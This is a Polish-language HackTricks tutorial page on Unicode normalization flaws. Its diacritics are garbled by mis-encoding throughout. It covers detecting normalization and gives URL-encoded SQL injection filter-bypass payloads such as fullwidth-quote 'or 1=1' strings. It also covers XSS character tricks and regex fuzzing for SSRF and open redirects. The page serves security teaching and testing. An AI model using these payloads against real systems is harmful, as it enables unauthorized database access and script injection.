# Normalizacja Unicode

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

**To jest podsumowanie:** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/). SprawdÅº tam, aby uzyskaÄ‡ wiÄ™cej szczegÃ³Å‚Ã³w (obrazy wziÄ™te stamtÄ…d).

## Zrozumienie Unicode i Normalizacji

Normalizacja Unicode to proces, ktÃ³ry zapewnia, Å¼e rÃ³Å¼ne binarne reprezentacje znakÃ³w sÄ… standaryzowane do tej samej wartoÅ›ci binarnej. Proces ten jest kluczowy w pracy z ciÄ…gami w programowaniu i przetwarzaniu danych. Standard Unicode definiuje dwa typy rÃ³wnowaÅ¼noÅ›ci znakÃ³w:

1. **RÃ³wnowaÅ¼noÅ›Ä‡ kanoniczna**: Znaki sÄ… uwaÅ¼ane za kanonicznie rÃ³wnowaÅ¼ne, jeÅ›li majÄ… ten sam wyglÄ…d i znaczenie, gdy sÄ… drukowane lub wyÅ›wietlane.
2. **RÃ³wnowaÅ¼noÅ›Ä‡ kompatybilnoÅ›ci**: SÅ‚absza forma rÃ³wnowaÅ¼noÅ›ci, w ktÃ³rej znaki mogÄ… reprezentowaÄ‡ ten sam abstrakcyjny znak, ale mogÄ… byÄ‡ wyÅ›wietlane inaczej.

IstniejÄ… **cztery algorytmy normalizacji Unicode**: NFC, NFD, NFKC i NFKD. KaÅ¼dy algorytm stosuje techniki normalizacji kanonicznej i kompatybilnoÅ›ci w inny sposÃ³b. Aby uzyskaÄ‡ gÅ‚Ä™bsze zrozumienie, moÅ¼esz zbadaÄ‡ te techniki na [Unicode.org](https://unicode.org/).

### Kluczowe punkty dotyczÄ…ce kodowania Unicode

Zrozumienie kodowania Unicode jest kluczowe, szczegÃ³lnie w przypadku problemÃ³w z interoperacyjnoÅ›ciÄ… miÄ™dzy rÃ³Å¼nymi systemami lub jÄ™zykami. Oto gÅ‚Ã³wne punkty:

* **Punkty kodowe i znaki**: W Unicode kaÅ¼dy znak lub symbol ma przypisanÄ… wartoÅ›Ä‡ numerycznÄ… znanÄ… jako "punkt kodowy".
* **Reprezentacja bajtÃ³w**: Punkt kodowy (lub znak) jest reprezentowany przez jeden lub wiÄ™cej bajtÃ³w w pamiÄ™ci. Na przykÅ‚ad znaki LATIN-1 (powszechne w krajach anglojÄ™zycznych) sÄ… reprezentowane za pomocÄ… jednego bajtu. Jednak jÄ™zyki z wiÄ™kszym zestawem znakÃ³w potrzebujÄ… wiÄ™cej bajtÃ³w do reprezentacji.
* **Kodowanie**: Termin ten odnosi siÄ™ do sposobu, w jaki znaki sÄ… przeksztaÅ‚cane w seriÄ™ bajtÃ³w. UTF-8 to powszechny standard kodowania, w ktÃ³rym znaki ASCII sÄ… reprezentowane za pomocÄ… jednego bajtu, a do czterech bajtÃ³w dla innych znakÃ³w.
* **Przetwarzanie danych**: Systemy przetwarzajÄ…ce dane muszÄ… byÄ‡ Å›wiadome uÅ¼ywanego kodowania, aby poprawnie przeksztaÅ‚ciÄ‡ strumieÅ„ bajtÃ³w w znaki.
* **Warianty UTF**: OprÃ³cz UTF-8 istniejÄ… inne standardy kodowania, takie jak UTF-16 (uÅ¼ywajÄ…cy minimum 2 bajtÃ³w, do 4) i UTF-32 (uÅ¼ywajÄ…cy 4 bajtÃ³w dla wszystkich znakÃ³w).

Zrozumienie tych koncepcji jest kluczowe, aby skutecznie radziÄ‡ sobie z potencjalnymi problemami wynikajÄ…cymi z zÅ‚oÅ¼onoÅ›ci Unicode i jego rÃ³Å¼nych metod kodowania.

PrzykÅ‚ad, jak Unicode normalizuje dwa rÃ³Å¼ne bajty reprezentujÄ…ce ten sam znak:
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Lista znakÃ³w rÃ³wnowaÅ¼nych Unicode znajduje siÄ™ tutaj:** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) oraz [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### Odkrywanie

JeÅ›li moÅ¼esz znaleÅºÄ‡ w aplikacji internetowej wartoÅ›Ä‡, ktÃ³ra jest zwracana, moÅ¼esz sprÃ³bowaÄ‡ wysÅ‚aÄ‡ **â€˜KELVIN SIGNâ€™ (U+0212A)**, ktÃ³ra **normalizuje siÄ™ do "K"** (moÅ¼esz wysÅ‚aÄ‡ to jako `%e2%84%aa`). **JeÅ›li "K" zostanie zwrÃ³cone**, to znaczy, Å¼e wykonywana jest jakaÅ› forma **normalizacji Unicode**.

Inny **przykÅ‚ad**: `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` po **unicode** to `Leonishan`.

## **PrzykÅ‚ady podatne**

### **ObejÅ›cie filtra SQL Injection**

WyobraÅº sobie stronÄ™ internetowÄ…, ktÃ³ra uÅ¼ywa znaku `'` do tworzenia zapytaÅ„ SQL z danymi wejÅ›ciowymi uÅ¼ytkownika. Ta strona, jako Å›rodek bezpieczeÅ„stwa, **usuwa** wszystkie wystÄ…pienia znaku **`'`** z danych wejÅ›ciowych uÅ¼ytkownika, ale **po tym usuniÄ™ciu** i **przed utworzeniem** zapytania, **normalizuje** dane wejÅ›ciowe uÅ¼ytkownika przy uÅ¼yciu **Unicode**.

Wtedy zÅ‚oÅ›liwy uÅ¼ytkownik mÃ³gÅ‚by wstawiÄ‡ inny znak Unicode rÃ³wnowaÅ¼ny `' (0x27)` jak `%ef%bc%87`, gdy dane wejÅ›ciowe zostanÄ… znormalizowane, powstaje pojedynczy apostrof i pojawia siÄ™ **vulnerabilnoÅ›Ä‡ SQLInjection**:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (702).png>)

**NiektÃ³re interesujÄ…ce znaki Unicode**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap template

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS (Cross Site Scripting)

MoÅ¼esz uÅ¼yÄ‡ jednego z nastÄ™pujÄ…cych znakÃ³w, aby oszukaÄ‡ aplikacjÄ™ internetowÄ… i wykorzystaÄ‡ XSS:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (2).png>)

ZauwaÅ¼, Å¼e na przykÅ‚ad pierwszy proponowany znak Unicode moÅ¼na wysÅ‚aÄ‡ jako: `%e2%89%ae` lub jako `%u226e`

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1) (1).png>)

### Fuzzing Regexes

Kiedy backend **sprawdza dane wejÅ›ciowe uÅ¼ytkownika za pomocÄ… regex**, moÅ¼e byÄ‡ moÅ¼liwe, Å¼e **wejÅ›cie** jest **normalizowane** dla **regex**, ale **nie** dla miejsca, w ktÃ³rym jest **uÅ¼ywane**. Na przykÅ‚ad, w przypadku Open Redirect lub SSRF regex moÅ¼e **normalizowaÄ‡ wysÅ‚any URL**, ale nastÄ™pnie **uzyskiwaÄ‡ do niego dostÄ™p tak, jak jest**.

NarzÄ™dzie [**recollapse**](https://github.com/0xacb/recollapse) \*\*\*\* pozwala na **generowanie wariacji wejÅ›cia** w celu fuzzowania backendu. Po wiÄ™cej informacji sprawdÅº **github** i ten [**post**](https://0xacb.com/2022/11/21/recollapse/).

## References

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
